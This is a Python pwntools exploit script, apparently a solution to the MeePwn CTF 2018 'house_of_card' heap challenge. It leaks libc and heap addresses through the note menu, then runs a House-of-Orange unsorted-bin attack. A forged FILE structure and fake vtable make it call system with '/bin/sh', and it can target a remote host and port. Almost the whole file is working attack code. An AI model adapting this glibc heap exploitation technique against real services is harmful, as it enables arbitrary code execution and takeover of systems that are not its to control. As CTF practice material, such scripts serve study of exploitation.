#!/usr/bin/env python

from pwn import *
import sys

def newNote(name, length, desc):
    r.sendlineafter("Quit", "1")
    r.sendlineafter("Name :", name)
    r.sendlineafter("Len?", str(length))
    r.sendlineafter("Description:", desc)

def editNote(idx, name, length, description, leak=False):
    r.sendlineafter("Quit", "2")
    if leak:   
        retVal = r.recvuntil("Back.")
        r.sendline(str(idx))
        return retVal
    r.sendlineafter("Back.", str(idx))
    r.sendlineafter("name?", name)
    r.sendlineafter("Len?", str(length))
    r.sendline(description)

def delNote(idx):
    r.sendlineafter("Quit", "3")
    r.sendlineafter("Back.", str(idx))
    
def exploit(r):
    ## LEAKS
    log.info("starting leaks...")
    newNote("A", 256, "B")
    newNote("C", 256, "D")
    newNote("E", 256, "F")
    newNote("G", 166, "H") 
    newNote("I", 135, "J")

    delNote(1)
    delNote(2)
    
    newNote("K"*0x3f, 437,"L")
    leak = editNote(5,0,0,0, leak=True)
    libc_base = u64(leak.split("\x09\x09\x48")[1][7:13].ljust(8,'\0'))-0x3c1b58
    heap_base = u64(leak.split("\x09\x09\x4c")[1][7:13].ljust(8,'\0'))-0x4c0
    IO_list_all = libc_base+0x3c2500
    p_IO_wstr_finish = libc_base+0x3bdc90
    system = libc_base+0x456a0
    bin_sh = libc_base+0x18ac40
    log.success("libc_base found at: "+hex(libc_base))
    log.success("heap_base found at: "+hex(heap_base))
    log.success("IO_list_all found at: "+hex(IO_list_all))
    log.success("p_IO_wstr_finish found at: "+hex(p_IO_wstr_finish))
    log.success("system found at: "+hex(system))
    log.success("str_bin_sh found at: "+hex(bin_sh))
    
    ## HOUSE-OF-ORANGE
    log.info("starting House-Of-Orange attack...")
    payload_1  = p64(0xb00bfaceb00bface)*6  # fp->_IO_write_ptr
    payload_1 += p64(bin_sh)                # fp->wide_data->buf_base
    
    payload_2  = "\x00"*68                  # fp->_flags2
    payload_2 += "A"*24
    payload_2 += p64(heap_base+0x4d0)       # fp->_wide_data
    payload_2 += "\x00"*48                  # fp->_mode
    payload_2 += p64(p_IO_wstr_finish-0x18) # fake vtable
    payload_2 += p64(0xb00bface)
    payload_2 += p64(system)                # ((_IO_strfile *) fp)->_s._free_buffer
    payload_2 += p64(0xb00bface)
    newNote(payload_1,186,payload_2) 
    
    payload = "Z"
    editNote(1,"000",260,payload)
    delNote(5)

    payload  = "Z"*0x10c
    payload += p64(heap_base+0xa0)          # start of unsorted_bin_attack chunk
    payload += p64(0x61)
    payload += p64(0xb00bface)
    payload += p64(IO_list_all-0x10)
    payload += p64(0x1337)                  # fp->_IO_write_base
    editNote(1,"000",261,payload)
   
    newNote("d",400,"cat /home/house_of_card/flag")
     
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        #r = process(['/home/vagrant/CTFs/meepwnctf18/HouseOfCard/house_of_card'], env={"LD_PRELOAD":""})
        r = process(['/home/vagrant/CTFs/meepwnctf18/HouseOfCard/house_of_card'], env={"LD_PRELOAD":"./libc.so"})
        print util.proc.pidof(r)
        pause()
        exploit(r)
